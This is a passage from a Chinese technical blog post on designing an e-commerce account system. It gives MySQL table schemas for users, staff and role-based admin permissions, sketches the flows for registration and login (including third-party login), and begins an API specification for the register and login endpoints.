class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_uid`</span> (<span class="string">`uid`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_platform_id`</span> (<span class="string">`platform_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'第三方用户信息'</span>;</span><br></pre></td></tr></table></figure>

<p><strong>用户模型</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 用户模型</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`skr_member`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'用户id'</span>,</span><br><span class="line">  <span class="string">`uid`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'账号id'</span>,</span><br><span class="line">  <span class="string">`nickname`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'昵称'</span>,</span><br><span class="line">  <span class="string">`avatar`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'头像(相对路径)'</span>,</span><br><span class="line">  <span class="string">`gender`</span> enum(<span class="string">'male'</span>,<span class="string">'female'</span>,<span class="string">'unknow'</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'unknow'</span> <span class="keyword">COMMENT</span> <span class="string">'性别'</span>,</span><br><span class="line">  <span class="string">`role`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'角色 0:普通用户 1:vip'</span>,</span><br><span class="line">  <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">  <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_uid`</span> (<span class="string">`uid`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'账户信息'</span>;</span><br></pre></td></tr></table></figure>

<p><strong>员工模型</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 员工表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`staff_info`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'员工id'</span>,</span><br><span class="line">    <span class="string">`uid`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'账号id'</span>,</span><br><span class="line">    <span class="string">`email`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工邮箱'</span>,</span><br><span class="line">    <span class="string">`phone`</span> <span class="built_in">varchar</span>(<span class="number">15</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工手机号'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工姓名'</span>,</span><br><span class="line">    <span class="string">`nickname`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工昵称'</span>,</span><br><span class="line">    <span class="string">`avatar`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工头像(相对路径)'</span>,</span><br><span class="line">    <span class="string">`gender`</span> enum(<span class="string">'male'</span>,<span class="string">'female'</span>,<span class="string">'unknow'</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'unknow'</span> <span class="keyword">COMMENT</span> <span class="string">'员工性别'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_uid`</span> (<span class="string">`uid`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_email`</span> (<span class="string">`email`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_phone`</span> (<span class="string">`phone`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'员工信息(这里列了大概的信息，多的可以垂直拆表)'</span>;</span><br></pre></td></tr></table></figure>

<p><strong>系统权限管理模型</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 系统map</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_ms`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">smallint</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`ms_name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系统名称'</span>,</span><br><span class="line">    <span class="string">`ms_desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系描述'</span>,</span><br><span class="line">    <span class="string">`ms_domain`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系统域名'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_domain`</span> (<span class="string">`ms_domain`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'系统map(登记目前存在的后台系统信息)'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 系统menu</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_ms_menu`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`ms_id`</span> <span class="built_in">smallint</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系统id'</span>,</span><br><span class="line">    <span class="string">`parent_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'父菜单id'</span>,</span><br><span class="line">    <span class="string">`menu_name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'菜单名称'</span>,</span><br><span class="line">    <span class="string">`menu_desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'菜描述'</span>,</span><br><span class="line">    <span class="string">`menu_uri`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'菜单uri'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`is_show`</span> enum(<span class="string">'yes'</span>,<span class="string">'no'</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'no'</span> <span class="keyword">COMMENT</span> <span class="string">'是否展示菜单'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_ms_id`</span> (<span class="string">`ms_id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_parent_id`</span> (<span class="string">`parent_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'系统menu'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 系统权限</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_item`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`ms_id`</span> <span class="built_in">tinyint</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系统id'</span>,</span><br><span class="line">    <span class="string">`menu_id`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'页面/接口uri'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_ms_menu`</span> (<span class="string">`ms_id`</span>, <span class="string">`menu_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'系统权限'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 系统权限(权限的各个集合)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_role`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'角色名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'角描述'</span>,</span><br><span class="line">    <span class="string">`auth_item_set`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'权限集合 多个值,号隔开'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'员工角色'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 角色与员工关系</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_role_staff`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`staff_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'员工id'</span>,</span><br><span class="line">    <span class="string">`role_set`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'角色集合 多个值,号隔开'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_staff_id`</span> (<span class="string">`staff_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'权限角色与员工关系'</span>;</span><br></pre></td></tr></table></figure>

<h2 id="交互设计"><a href="#交互设计" class="headerlink" title="交互设计"></a>交互设计</h2><blockquote>
<p>友情提示：一大波图片即将到来，此处图片较多，不清楚的可点击大图查看</p>
</blockquote>
<h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>注册成功之后存在至少两种交互方式：</p>
<ol>
<li>注册成功 -&gt; 跳转到登录页面</li>
<li>注册成功 -&gt; 自动登录 -&gt; 跳转到应用首页(或者其他页面)</li>
</ol>
<p>具体交互流程如下：</p>
<p><img src="/articles/电商设计手册/skr-account-register-bmpr.png" alt><br><img src="/articles/电商设计手册/skr-account-register.jpg" alt><br><img src="/articles/电商设计手册/skr-account-register-result-2.png" alt> </p>
<hr>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><h4 id="普通登录"><a href="#普通登录" class="headerlink" title="普通登录"></a>普通登录</h4><p><img src="/articles/电商设计手册/skr-account-login-page.png" alt><br><img src="/articles/电商设计手册/skr-account-login-logic.jpg" alt><br><img src="/articles/电商设计手册/skr-account-home-page.png" alt></p>
<h4 id="快捷登录"><a href="#快捷登录" class="headerlink" title="快捷登录"></a>快捷登录</h4><p>快捷登录的流程基本和上面一致只是验证密码换成了验证验证码。</p>
<p><img src="/articles/电商设计手册/skr-account-simple-login-page.png" alt></p>
<hr>
<h4 id="第三方登录"><a href="#第三方登录" class="headerlink" title="第三方登录"></a>第三方登录</h4><p>第三方登录的交互其实存在这样的问题：</p>
<ol>
<li>第三方账户登录成功后还需要绑定手机号/Email吗？</li>
</ol>
<p>因为我发现有些PM为了提高用户使用的简单快捷性，往往第三方登录成功后会直接产生uid，而不进行账号的绑定。这样之后在再进行账号绑定就涉及账号合并的问题，很麻烦(如果有钱包等)。如果我们一开始就进行绑定操作，这样未来账号的关系就清晰明了便于维护，第三方登录其实就相当于普通账号的别名。<br>最后这个事情做不做的结果就是，账户表account_user和第三方用户信息表account_platform是的<strong>一对多</strong>还是<strong>一对一</strong>的关系。</p>
<ol start="2">
<li>如果绑定，已经注册的手机号/Email是否可以绑定？</li>
</ol>
<p>这个还好说，一般来说绑定的选择基本是正确的。最后具体的流程图如下：</p>
<p><img src="/articles/电商设计手册/skr-account-platform-login.jpg" alt></p>
<p>交互界面图如下： </p>
<p><img src="/articles/电商设计手册/skr-account-platform-login-page.png" alt></p>
<hr>
<h3 id="后台权限管理"><a href="#后台权限管理" class="headerlink" title="后台权限管理"></a>后台权限管理</h3><p>首先，我们的后台管理系统需要个响亮的称号，想了一会以前公司用过apollo,于是我准备用mars但突然冒出来个earth，地球万物之根，刚好我们这又是个全业务的基础服务管理系统，哈哈就这样吧～ <strong>Earth System</strong></p>
<p><strong>Earth System</strong>的权限管理功能主要分为以下四部分：</p>
<ul>
<li>系统管理(The manage system page)<ul>
<li>编辑页面</li>
<li>列表页面</li>
</ul>
</li>
<li>菜单管理(The menu page)<ul>
<li>编辑页面</li>
<li>列表页面</li>
</ul>
</li>
<li>角色管理(The role page)<ul>
<li>编辑页面</li>
<li>列表页面</li>
</ul>
</li>
<li>员工与角色关联管理(The role staff map page)<ul>
<li>编辑页面</li>
<li>列表页面</li>
</ul>
</li>
</ul>
<p>具体交互如下：</p>
<p><img src="/articles/电商设计手册/skr-earth-2.jpg" alt></p>
<hr>
<h2 id="接口设计"><a href="#接口设计" class="headerlink" title="接口设计"></a>接口设计</h2><h3 id="应用层接口-对外"><a href="#应用层接口-对外" class="headerlink" title="应用层接口(对外)"></a>应用层接口(对外)</h3><p>1.注册接口</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>username</td>
<td>string</td>
<td>非必传</td>
<td>用户账号</td>
</tr>
<tr>
<td>email</td>
<td>string</td>
<td>email/phone两者择一</td>
<td>用户邮箱</td>
</tr>
<tr>
<td>phone</td>
<td>string</td>
<td>email/phone两者择一</td>
<td>用户手机号</td>
</tr>
<tr>
<td>code</td>
<td>int</td>
<td>必传</td>
<td>验证码</td>
</tr>
</tbody></table>
<p>交互方式一(跳转到登录页面)响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>交互方式二(跳转到首页页面)响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"s_token"</span>: <span class="string">"string, 用户会话标示"</span>,</span><br><span class="line">        <span class="attr">"s_token_expire"</span>: <span class="string">"string, 用户会话标示过期时间，0不过期"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"string, 用户名"</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"string, 用户昵称"</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">"string, 用户头像"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>: <span class="string">"string, 用户性别，male:男，female:女，other:未知"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.登录接口</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>username</td>
<td>string</td>
<td>username/email/phone三者择一</td>
<td>用户账号</td>
</tr>
<tr>
<td>email</td>
<td>string</td>
<td>username/email/phone三者择一</td>
<td>用户邮箱</td>
</tr>
<tr>
<td>phone</td>
<td>string</td>
<td>username/email/phone三者择一</td>
<td>用户手机号</td>
</tr>
<tr>
<td>password</td>
<td>string</td>
<td>必传</td>
<td>密码</td>
</tr>
